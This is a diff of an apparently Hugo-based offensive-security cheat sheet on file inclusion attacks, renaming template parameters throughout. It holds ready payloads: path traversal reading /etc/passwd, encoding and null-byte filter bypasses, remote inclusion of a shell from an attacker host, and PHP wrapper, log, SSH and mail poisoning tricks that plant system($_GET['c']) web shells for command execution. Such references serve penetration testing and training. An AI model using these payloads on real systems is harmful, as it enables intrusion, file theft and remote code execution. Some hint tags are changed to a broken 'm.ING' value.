@@ -50,13 +50,13 @@ and remote code execution (RCE).[^owasp-path-traversal]
 #### Absolute Path Traversal
 
 ```text
-http://{{< param "war.rdomain" >}}/index.php?page=/etc/passwd
+http://{{< param "m.RDOMAIN" >}}/index.php?page=/etc/passwd
 ```
 
 #### Relative Path Traversal
 
 ```text
-http://{{< param "war.rdomain" >}}/index.php?page=../../../etc/passwd
+http://{{< param "m.RDOMAIN" >}}/index.php?page=../../../etc/passwd
 ```
 
 ### Null Byte
@@ -68,10 +68,10 @@ A null byte will make the application
 ignore the following characters.
 
 ```text
-http://{{< param "war.rdomain" >}}/index.php?page=../../../etc/passwd%00
+http://{{< param "m.RDOMAIN" >}}/index.php?page=../../../etc/passwd%00
 ```
 
-{{<hint warning>}}
+{{<hint m.ING>}}
 PHP fixed the issue
 in version 5.3.4. <https://bugs.php.net/bug.php?id=39863>
 {{</hint>}}
@@ -85,13 +85,13 @@ characters after that,
 ignored.
 
 ```text
-http://{{< param "war.rdomain" >}}/index.php?page=../../../etc/passwd................[ADD MORE]
-http://{{< param "war.rdomain" >}}/index.php?page=../../../etc/passwd\.\.\.\.\.\.\.\.[ADD MORE]
-http://{{< param "war.rdomain" >}}/index.php?page=../../../etc/passwd/./././././././.[ADD MORE]
-http://{{< param "war.rdomain" >}}/index.php?page=../../../[ADD MORE]../../../../../etc/passwd
+http://{{< param "m.RDOMAIN" >}}/index.php?page=../../../etc/passwd................[ADD MORE]
+http://{{< param "m.RDOMAIN" >}}/index.php?page=../../../etc/passwd\.\.\.\.\.\.\.\.[ADD MORE]
+http://{{< param "m.RDOMAIN" >}}/index.php?page=../../../etc/passwd/./././././././.[ADD MORE]
+http://{{< param "m.RDOMAIN" >}}/index.php?page=../../../[ADD MORE]../../../../../etc/passwd
 ```
 
-{{<hint warning>}}
+{{<hint m.ING>}}
 In PHP:
 `/etc/passwd` = `/etc//passwd` = `/etc/./passwd` = `/etc/passwd/` = `/etc/passwd/`
 {{</hint>}}
@@ -128,21 +128,21 @@ may allow bypassing poorly implemented input filtering.
 #### Double URL Encoding
 
 ```text
-http://{{< param "war.rdomain" >}}/index.php?page=%252e%252e%252fetc%252fpasswd
+http://{{< param "m.RDOMAIN" >}}/index.php?page=%252e%252e%252fetc%252fpasswd
 ```
 
 #### UTF-8 Encoding
 
 ```text
-http://{{< param "war.rdomain" >}}/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+http://{{< param "m.RDOMAIN" >}}/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
 ```
 
 ### Bypass Filtering
 
 ```text
-http://{{< param "war.rdomain" >}}/index.php?page=....//....//etc/passwd
-http://{{< param "war.rdomain" >}}/index.php?page=..///////..////..//////etc/passwd
-http://{{< param "war.rdomain" >}}/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
+http://{{< param "m.RDOMAIN" >}}/index.php?page=....//....//etc/passwd
+http://{{< param "m.RDOMAIN" >}}/index.php?page=..///////..////..//////etc/passwd
+http://{{< param "m.RDOMAIN" >}}/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
 ```
 
 ### Bypass `../` removal
@@ -156,7 +156,7 @@ http://{{< param "war.rdomain" >}}/index.php?page=/%5C../%5C../%5C../%5C../%5C..
 
 ```text
 ..;/
-http://{{< param "war.rdomain" >}}/page.jsp?include=..;/..;/sensitive.txt
+http://{{< param "m.RDOMAIN" >}}/page.jsp?include=..;/..;/sensitive.txt
 ```
 
 ### Windows UNC Share [^unc-share]
@@ -176,13 +176,13 @@ can be used for RFI.
 ### Basic RFI
 
 ```text
-http://{{< param "war.rdomain" >}}/index.php?page=http://{{< param "war.ldomain" >}}/shell.txt
+http://{{< param "m.RDOMAIN" >}}/index.php?page=http://{{< param "m.LDOMAIN" >}}/shell.txt
 ```
 
 ### Null Byte
 
 ```text
-http://{{< param "war.rdomain" >}}/index.php?page=http://{{< param "war.ldomain" >}}/shell.txt%00
+http://{{< param "m.RDOMAIN" >}}/index.php?page=http://{{< param "m.LDOMAIN" >}}/shell.txt%00
 ```
 
 ### Bypass `http(s)://` removal
@@ -201,7 +201,7 @@ Simply including a script
 located in an open share.
 
 ```text
-http://{{< param "war.rdomain" >}}/index.php?page=\\{{< param "war.lhost" >}}\share\shell.php
+http://{{< param "m.RDOMAIN" >}}/index.php?page=\\{{< param "m.LHOST" >}}\share\shell.php
 ```
 
 ## PHP Stream Wrappers
@@ -230,20 +230,20 @@ chained using `|` or `/`.
 #### Filter [string.rot13](https://www.php.net/manual/en/filters.string.php#filters.string.rot13).
 
 ```text
-http://{{< param "war.rdomain" >}}/index.php?page=php://filter/read=string.rot13/resource=index.php
+http://{{< param "m.RDOMAIN" >}}/index.php?page=php://filter/read=string.rot13/resource=index.php
 ```
 
 #### Filter [convert.base64](https://www.php.net/manual/en/filters.convert.php#filters.convert.base64).
 
 ```text
-http://{{< param "war.rdomain" >}}/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
-http://{{< param "war.rdomain" >}}/index.php?page=php://filter/convert.base64-encode/resource=index.php
+http://{{< param "m.RDOMAIN" >}}/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
+http://{{< param "m.RDOMAIN" >}}/index.php?page=php://filter/convert.base64-encode/resource=index.php
 ```
 
 #### Filter chaining [zlib.deflate](https://www.php.net/manual/en/filters.compression.php#filters.compression.zlib) and [convert.base64](https://www.php.net/manual/en/filters.convert.php#filters.convert.base64).
 
 ```text
-http://{{< param "war.rdomain" >}}/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+http://{{< param "m.RDOMAIN" >}}/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
 ```
 
 ##### Base64 decode and gzip inflate.
@@ -271,7 +271,7 @@ echo -n '<?php system($_GET['c']); ?>' > shell.php
 zip shell.jpg shell.php
 ```
 ```text
-http://{{< param "war.rdomain" >}}/index.php?page=zip://shell.jpg%23shell.php
+http://{{< param "m.RDOMAIN" >}}/index.php?page=zip://shell.jpg%23shell.php
 ```
 
 ### data://
@@ -289,7 +289,7 @@ echo -n '<?php system($_GET['c']); ?>' | base64
 PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=
 ```
 ```text
-http://{{< param "war.rdomain" >}}/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=&c=ls
+http://{{< param "m.RDOMAIN" >}}/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=&c=ls
 ```
 
 ### expect://
@@ -299,7 +299,7 @@ http://{{< param "war.rdomain" >}}/index.php?page=data://text/plain;base64,PD9wa
 via PTY.
 
 ```text
-http://{{< param "war.rdomain" >}}/index.php?page=expect://ls
+http://{{< param "m.RDOMAIN" >}}/index.php?page=expect://ls
 ```
 
 ### php://input
@@ -308,7 +308,7 @@ http://{{< param "war.rdomain" >}}/index.php?page=expect://ls
 from the request body.
 
 ```sh
-curl -X POST --data "<?php echo shell_exec('ls'); ?>" "http://{{< param "war.rdomain" >}}/index.php?page=php://input%00" -v
+curl -X POST --data "<?php echo shell_exec('ls'); ?>" "http://{{< param "m.RDOMAIN" >}}/index.php?page=php://input%00" -v
 ```
 ## The `proc` File System
 
@@ -408,13 +408,13 @@ to be used by
 the self-contained modules.[^ush-lfi2rce]
 
 ```sh
-curl "http://{{< param "war.rdomain" >}}/index.php?page=/proc/self/environ&c=id" -H "User-Agent" --data "<?php system($_GET['c']); ?>"
+curl "http://{{< param "m.RDOMAIN" >}}/index.php?page=/proc/self/environ&c=id" -H "User-Agent" --data "<?php system($_GET['c']); ?>"
 ```
 
 #### /proc/[PID]/fd/[FD] [^swissky-dt]
 
 1. Upload A LOT of shells.
-2. Include `http://{{< param "war.rdomain" >}}/index.php?page=/proc/$PID/fd/$fd`.
+2. Include `http://{{< param "m.RDOMAIN" >}}/index.php?page=/proc/$PID/fd/$fd`.
 
     Bruteforce the process ID (`$PID`)
     and file descriptor id (`$FD`)
@@ -455,7 +455,7 @@ Make a valid request
 with the code in the `User-Agent` header.
 
 ```sh
-curl -H 'User-Agent' --data "<?php system($_GET['c']); ?>" "http://{{< param "war.rdomain" >}}" -v
+curl -H 'User-Agent' --data "<?php system($_GET['c']); ?>" "http://{{< param "m.RDOMAIN" >}}" -v
 ```
 #### Error Log
 Make an invalid request,
@@ -463,10 +463,10 @@ an invalid inclusion for example,
 with the suitable `Referer` header.
 
 ```sh
-curl -H 'Referer' --data "<?php system($_GET['c']); ?>" "http://{{< param "war.rdomain" >}}/invalid#req" -v
+curl -H 'Referer' --data "<?php system($_GET['c']); ?>" "http://{{< param "m.RDOMAIN" >}}/invalid#req" -v
 ```
 
-{{<hint warning>}}
+{{<hint m.ING>}}
 The Apache logging API
 escapes strings going to the logs.
 
@@ -477,7 +477,7 @@ since double quotes (`"`) are replaced escaped as `"quote";`
 #### LFI
 
 ```txt
-http://{{< param "war.rdomain" >}}/index.php?page=/path/to/access.log&c=id
+http://{{< param "m.RDOMAIN" >}}/index.php?page=/path/to/access.log&c=id
 ```
 
 #### Common Apache Log Paths
@@ -513,13 +513,13 @@ Create a connection to SSH
 with the suitable username.
 
 ```sh
-ssh '<?php system('id'); ?>'@{{< param "war.rdomain" >}}
+ssh '<?php system('id'); ?>'@{{< param "m.RDOMAIN" >}}
 ```
 
 #### LFI
 
 ```txt
-http://{{< param "war.rdomain" >}}/index.php?page=/path/to/sshd.log&c=id
+http://{{< param "m.RDOMAIN" >}}/index.php?page=/path/to/sshd.log&c=id
 ```
 
 #### Common SSH Log Paths
@@ -535,13 +535,13 @@ Email an internal account,
 containing the script.
 
 ```sh
-mail -s "<?php system($_GET['c']);?>" www-data@{{< param "war.rhost" >}} < /dev/null
+mail -s "<?php system($_GET['c']);?>" www-data@{{< param "m.RHOST" >}} < /dev/null
 ```
 
 #### LFI
 
 ```txt
-http://{{< param "war.rdomain" >}}/index.php?page=/var/mail/www-data&c=id
+http://{{< param "m.RDOMAIN" >}}/index.php?page=/var/mail/www-data&c=id
 ```
 
 ## Further Reading
